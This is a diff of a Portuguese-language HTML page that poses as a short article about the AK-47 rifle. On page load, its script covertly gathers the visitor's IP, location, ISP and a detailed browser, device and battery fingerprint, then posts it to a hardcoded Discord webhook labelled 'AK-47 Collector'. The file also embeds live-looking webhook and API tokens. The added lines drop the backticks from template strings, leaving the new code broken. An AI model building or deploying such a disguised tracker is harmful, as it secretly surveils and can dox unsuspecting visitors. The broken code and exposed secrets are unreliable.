@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Ak-47.</title>
+  <title>Ak-47</title>
 </head>
 <body>
   <h1>Carregando...</h1>
@@ -9,15 +9,13 @@
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi";
     const ipinfoToken = "e21650a9d682be";
-    // Substitua abaixo pela sua chave real do IPHub (não base64, só a chave simples)
-    const iphubKey = "29055:7bBszJXz8vEV8HACRt7qN0Pb5JMQLbBR";
 
     function getBrowserVersion(ua) {
       let match = ua.match(/(Edg|Chrome|Firefox|Safari)\/([\d\.]+)/);
       if (match) {
         let name = match[1];
         if(name === "Edg") name = "Microsoft Edge";
-        return `${name} ${match[2]}`;
+        return ${name} ${match[2]};
       }
       return "Desconhecido";
     }
@@ -27,29 +25,23 @@
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify(payload)
-      }).catch(console.error);
+      });
     }
 
     async function coletarEEnviarDados() {
       try {
+        
         const ipResponse = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipResponse.json();
         const ip = ipData.ip;
-
-        // Requisições às APIs (todas HTTPS)
-        const [ipinfoData, ipapiData, ipwhoData, iphubData] = await Promise.all([
-          fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`).then(res => res.ok ? res.json() : {}),
-          fetch(`https://pro.ip-api.com/json/${ip}?fields=66846719&key=demo`).then(res => res.ok ? res.json() : {}), // OBS: ip-api não é oficialmente free e ilimitada. Aqui use seu token ou troque a API.
-          fetch(`https://ipwho.is/${ip}`).then(res => res.ok ? res.json() : {}),
-          fetch(`https://iphub.info/api/ip/${ip}`, {
-            headers: { "X-Key": iphubKey }
-          }).then(res => res.ok ? res.json() : {})
-        ]);
-
+        
+        const ipinfoResponse = await fetch(https://ipinfo.io/${ip}/json?token=${ipinfoToken});
+        const ipinfoData = await ipinfoResponse.json();
+        
         const userAgent = navigator.userAgent;
         const language = navigator.language;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const screenResolution = `${screen.width}x${screen.height}`;
+        const screenResolution = ${screen.width}x${screen.height};
         const devicePixelRatio = window.devicePixelRatio;
         const plugins = [...navigator.plugins].map(p => p.name).join(", ") || "Nenhum";
         const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
@@ -61,7 +53,7 @@
         const online = navigator.onLine;
         const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
         const browserVersion = getBrowserVersion(userAgent);
-
+        
         function enviarComBateria(batteryLevel, charging) {
           const embed = {
             title: "🕵️ Novo visitante",
@@ -70,11 +62,9 @@
               { name: "IP", value: ip, inline: true },
               { name: "Cidade", value: ipinfoData.city || "N/A", inline: true },
               { name: "Região", value: ipinfoData.region || "N/A", inline: true },
-              { name: "País", value: `${ipapiData.country || ipinfoData.country || "N/A"} (${ipwhoData.continent || "N/A"})`, inline: true },
+              { name: "País", value: ipinfoData.country || "N/A", inline: true },
               { name: "Localização (lat,long)", value: ipinfoData.loc || "N/A", inline: true },
-              { name: "Organização", value: ipapiData.org || ipinfoData.org || "N/A", inline: true },
-              { name: "ASN", value: ipwhoData.asn || "N/A", inline: true },
-              { name: "Moeda", value: ipwhoData.currency?.code ? `${ipwhoData.currency.code} (${ipwhoData.currency.symbol})` : "N/A", inline: true },
+              { name: "Organização", value: ipinfoData.org || "N/A", inline: true },
               { name: "Timezone (IPinfo)", value: ipinfoData.timezone || "N/A", inline: true },
               { name: "Navegador (userAgent)", value: userAgent, inline: false },
               { name: "Versão do navegador", value: browserVersion, inline: true },
@@ -85,34 +75,43 @@
               { name: "Plugins", value: plugins, inline: false },
               { name: "Núcleos da CPU", value: hardwareConcurrency.toString(), inline: true },
               { name: "Memória RAM aproximada (GB)", value: deviceMemory.toString(), inline: true },
-              { name: "Conexão", value: `Tipo: ${connectionType}, Downlink: ${downlink}`, inline: true },
+              { name: "Conexão", value: Tipo: ${connectionType}, Downlink: ${downlink}, inline: true },
               { name: "Cookies habilitados", value: cookieEnabled ? "Sim" : "Não", inline: true },
               { name: "Online", value: online ? "Sim" : "Não", inline: true },
               { name: "Prefere modo escuro", value: prefersDarkMode ? "Sim" : "Não", inline: true },
               { name: "Nível da bateria", value: batteryLevel, inline: true },
-              { name: "Carregando bateria", value: charging, inline: true },
-              { name: "Proxy/VPN (ip-api)", value: `Hosting: ${ipapiData.hosting || "N/A"}, Proxy: ${ipapiData.proxy || "N/A"}, Mobile: ${ipapiData.mobile || "N/A"}`, inline: false },
-              { name: "Proxy/VPN (iphub)", value: iphubData.block === 1 ? "🔴 Provável Proxy/VPN" : iphubData.block === 2 ? "🟠 Datacenter" : "🟢 Conexão residencial", inline: false }
+              { name: "Carregando bateria", value: charging, inline: true }
             ],
-            footer: { text: "AK-47 Collector" },
+            footer: {
+              text: "AK-47 Collector"
+            },
             timestamp: new Date().toISOString()
           };
 
           sendPayload({ embeds: [embed] });
 
-          document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo... (texto completo mantido aqui)</h2>`;
-        }
+          document.body.innerHTML = <h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.
 
+Projetada para ser simples, resistente e confiável, a AK-47 funciona em praticamente qualquer ambiente – desde desertos escaldantes até florestas úmidas. Seu calibre 7.62x39mm oferece um equilíbrio entre poder de fogo e controle de recuo, tornando-a eficaz em combate de curta e média distância.
+
+A principal característica da AK-47 é sua durabilidade. Ela pode continuar funcionando mesmo com pouca manutenção, sujeira ou após anos de uso. Isso a tornou uma escolha popular entre exércitos regulares, milícias e grupos insurgentes.
+
+Com mais de 100 milhões de unidades produzidas (contando variantes licenciadas e não licenciadas), a AK-47 é considerada a arma de fogo mais produzida da história. Seu design também deu origem a várias versões, como a AKM, AK-74 e muitas outras adaptações fabricadas em diferentes países.
+
+Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global. - Chat GPT</h2>;
+        }
+        
         if (navigator.getBattery) {
           navigator.getBattery().then(battery => {
             const batteryLevel = Math.round(battery.level * 100) + "%";
             const charging = battery.charging ? "Sim" : "Não";
             enviarComBateria(batteryLevel, charging);
-          }).catch(() => enviarComBateria("N/A", "N/A"));
+          }).catch(() => {
+            enviarComBateria("N/A", "N/A");
+          });
         } else {
           enviarComBateria("N/A", "N/A");
         }
-
       } catch (error) {
         console.error("Erro ao obter ou enviar informações:", error);
         document.body.innerHTML = "<h2>Erro ao verificar.</h2>";
